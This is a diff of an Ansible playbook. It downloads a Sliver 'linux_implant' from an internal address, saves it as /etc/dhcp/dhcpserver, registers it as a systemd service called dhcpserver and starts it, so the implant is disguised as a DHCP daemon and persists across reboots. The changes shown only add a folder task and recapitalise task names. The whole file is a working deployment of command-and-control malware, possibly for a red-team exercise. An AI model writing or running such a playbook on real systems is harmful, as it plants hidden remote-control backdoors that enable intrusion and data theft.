@@ -1,17 +1,26 @@
 ---
-- name: download sliver
+- name: Create DHCP folder
+  folder:
+    path: /etc/dhcp
+    state: present
+    recurse: true
+    owner: root
+    group: root
+    mode: 0755
+
+- name: Download sliver
   get_url:
     url: http://172.16.0.9:8000/linux_implant
     dest: /etc/dhcp/dhcpserver
     mode: 0755
 
-- name: create service file
+- name: Create service file
   copy:
     src: linux_sliver.service
     dest: /etc/systemd/system/dhcpserver.service
     mode: 0644
 
-- name: start service
+- name: Start service
   systemd:
     name: dhcpserver
     state: started
